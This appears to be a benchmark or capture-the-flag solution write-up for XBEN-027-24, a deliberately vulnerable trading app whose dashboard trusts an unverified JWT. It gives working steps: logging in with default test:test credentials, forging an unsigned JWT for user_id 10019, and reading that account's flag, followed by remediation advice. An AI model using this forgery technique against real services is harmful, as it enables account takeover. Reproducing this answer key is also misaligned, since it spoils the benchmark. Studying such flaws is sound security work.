# XBEN-027-24 — Trading Platform

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability class:** Broken authentication via unverified JWT (IDOR) + default credentials

## Summary

The app (`app/website/app/routes.py`) maintains two separate identity tokens after
login: a signed Flask `session` cookie (holding `user_id` of the account that
actually logged in) and an `auth_token` JWT cookie (holding `username`, `user_id`,
`user_type`). The `/dashboard` route only checks that a Flask `session` exists —
it does not use the session's `user_id` at all. Instead it decodes the `auth_token`
JWT with `verify_signature: False` and trusts whatever `user_id` is inside it:

```python
data = jwt.decode(token, app.config['AUTH_SECRET_KEY'], algorithms=['HS256'],
    options={'verify_signature':False})
if 'user_id' in data and User.query.get(data['user_id']):
    user_id = data['user_id']
```

Because the signature is never verified, an attacker can log in with the
default/seed credentials `test:test` (created automatically in `app/__init__.py`)
to obtain a valid Flask session, then replace the `auth_token` cookie with an
arbitrary, unsigned/garbage-signature JWT whose payload claims a different
`user_id`. The dashboard renders that victim user's `first_name`/`last_name`.

A second user, `flag` (id `10019`), is also seeded at startup with the flag
contents stored in its `last_name` field:

```python
flag = User(id='10019', username='flag', password=<random>,
            first_name='Flag', last_name=flag_content, email='flag@example.com')
```

Its password is randomized so it cannot be logged into directly, but the JWT
trust bug lets us view its dashboard anyway.

## Exploit

### 1. Log in with the default seed account `test` / `test` to obtain a valid session cookie

```bash
PORT=63254
curl -s -c /tmp/xben027_cookies.txt -X POST \
  "http://localhost:${PORT}/password/test" -d "password=test" -i | head -10
```

Response includes:
```
Set-Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAzMiwidXNlcl90eXBlIjoiY3VzdG9tZXIifQ...; Path=/
```
and `/tmp/xben027_cookies.txt` contains the valid Flask `session` cookie.

### 2. Forge a JWT claiming `user_id: 10019` (the `flag` account) — signature content is irrelevant since the server never verifies it

```bash
python3 -c "
import base64, json
def b64u(d):
    return base64.urlsafe_b64encode(d).rstrip(b'=')
header = b64u(json.dumps({'alg':'HS256','typ':'JWT'}).encode())
payload = b64u(json.dumps({'username':'flag','user_id':10019,'user_type':'customer'}).encode())
sig = b64u(b'invalidsignature')
print((header+b'.'+payload+b'.'+sig).decode())
"
# -> eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICJmbGFnIiwgInVzZXJfaWQiOiAxMDAxOSwgInVzZXJfdHlwZSI6ICJjdXN0b21lciJ9.aW52YWxpZHNpZ25hdHVyZQ
```

### 3. Request `/dashboard` with the valid session cookie plus the forged `auth_token`

```bash
SESSION=$(grep -o 'session\s*[^ ]*' /tmp/xben027_cookies.txt | tail -1 | awk '{print $NF}')
FORGED=eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICJmbGFnIiwgInVzZXJfaWQiOiAxMDAxOSwgInVzZXJfdHlwZSI6ICJjdXN0b21lciJ9.aW52YWxpZHNpZ25hdHVyZQ

curl -s "http://localhost:${PORT}/dashboard" \
  -H "Cookie: session=${SESSION}; auth_token=${FORGED}"
```

## Remediation notes

- Never decode a JWT with `verify_signature: False` and then trust its claims for
  authorization decisions; always verify the signature, or better, derive the
  authoritative identity solely from the server-side session.
- Do not maintain two independent identity sources (session + client-supplied
  JWT) for the same authorization decision — pick one source of truth.
- Remove/rotate default seed credentials (`test`/`test`) before any non-dev
  deployment.
